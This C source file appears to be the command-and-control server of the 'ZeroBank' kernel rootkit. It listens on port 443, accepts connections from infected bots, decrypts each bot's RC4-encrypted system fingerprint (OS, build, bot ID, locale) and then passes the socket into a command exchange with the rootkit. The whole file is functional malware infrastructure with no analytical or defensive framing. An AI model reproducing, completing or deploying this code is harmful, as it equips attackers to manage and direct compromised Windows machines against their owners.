#include "server_globals.h"

static SOCKET socket_array[100];
static int counter;
RTL_CRITICAL_SECTION g_sec = { 0 };

DWORD WINAPI ClientThread(LPVOID lParam)
{
	SOCKET sock = (SOCKET)lParam;
	PZEROBANK_BOT_HEADER rootkit_header = NULL, Entry = NULL;
	PVOID Out = NULL;

	RtlEnterCriticalSection(&g_sec);

	printf("\r\n[^*^] New ZeroBank bot connected");

	Out = recv_decrypted(sock, RC4_KEY_1, (PZEROBANK_BOT_HEADER)Entry, sizeof(ZEROBANK_BOT_HEADER));
	if (Out != NULL)
	{
		rootkit_header = (PZEROBANK_BOT_HEADER)Out;
		if (rootkit_header)
		{

			printf("\r\n\nOs: %s | Win: %u.%u | Build: %u | Sys: %s | ID: %s | Server: %s | LocaleId: %s | LanguageId: %s",
				rootkit_header->Os,
				rootkit_header->majorver,
				rootkit_header->minorver,
				rootkit_header->Build,
				rootkit_header->Arch,
				rootkit_header->BotId,
				rootkit_header->IsNtServer ? "Yes" : "No",
				rootkit_header->Locale,
				rootkit_header->lang);
		}
	}

	RtlFreeHeap(GetProcessHeap(), 0, Out);
	Out = NULL;

	RtlLeaveCriticalSection(&g_sec);

	/// start command exchange with rootkit

	rootkit_cmd(sock);
}

DWORD WINAPI ServerThread(USHORT Port, PCHAR Ip) 
{
	SOCKET sock, acceptsock;
	SOCKADDR_IN sai;
	SOCKADDR_IN acceptsai;
	WSADATA wsa;
	INT Size;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) 
		return WSASYSNOTREADY;


	sai.sin_addr.s_addr = inet_addr(Ip);
	sai.sin_family = AF_INET;
	sai.sin_port = htons(Port);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
		return 1;

	bind(sock, (SOCKADDR*)&sai, sizeof(sai));
	listen(sock, 100);
	Size = sizeof(acceptsai);

	printf("\r\n[^*^] ZeroBank server listening incoming connections...");

	while (1) 
	{
		acceptsock = accept(sock, (SOCKADDR*)&acceptsai, &Size);
		CreateThread(NULL, 0, ClientThread, (LPVOID)acceptsock, 0, NULL);
		socket_array[counter] = acceptsock;
		counter++;
	}
	closesocket(sock);
	WSACleanup();
	return EXIT_SUCCESS;
}


INT main(INT argc, PCHAR Argv[])
{

	RtlInitializeCriticalSection(&g_sec);

	HANDLE std = GetStdHandle(STD_OUTPUT_HANDLE);
	if (std == INVALID_HANDLE_VALUE)
		return 1;

	COORD coord;
	coord.X = 300;
	coord.Y = 800;

	SetConsoleScreenBufferSize(std, coord);
	SetConsoleTitle(TEXT("ZeroBank (ring0 kit bundle)"));

	ServerThread(443, "192.168.1.36");
}